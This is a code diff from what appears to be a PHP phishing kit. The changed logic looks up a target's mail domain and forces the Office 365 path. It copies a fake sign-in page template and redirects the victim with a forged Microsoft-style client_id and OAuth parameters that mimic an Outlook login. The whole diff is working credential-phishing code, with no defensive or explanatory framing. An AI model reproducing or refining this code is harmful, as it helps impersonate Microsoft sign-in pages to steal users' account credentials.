@@ -367,7 +367,8 @@ $domain = str_replace("@","",$atdomain);
 
 $hosts = array();
 getmxrr($domain, $hosts);
-$owac = check_owa($domain);
+//$owac = check_owa($domain);
+$owac = "office";
 $a = strtolower($hosts[0]);
 
 if (strpos($a, 'outlook') !== false) {
@@ -483,9 +484,11 @@ elseif ($owac == 'old exchange'){
 	header("Location: $dst/load.php?token=$token_kr");	
 }
 else {
-	$src="domain";
+	$src="office";
+	$client_id="000000".RandNumber(4)."-0000-0".RandString(3)."-".RandString(2)."00-000000000";
+	$token = $token_kr;
 	recurse_copy( $src, $dst );
-	header("Location: $dst/load.php?token=$token_kr");
+	header("Location: $dst/?client_id=$client_id&y=$token&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=client_id&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=45f4d5f9-4657-4816-9528-af3f59994174&protectedtoken=true");
 }
 
 
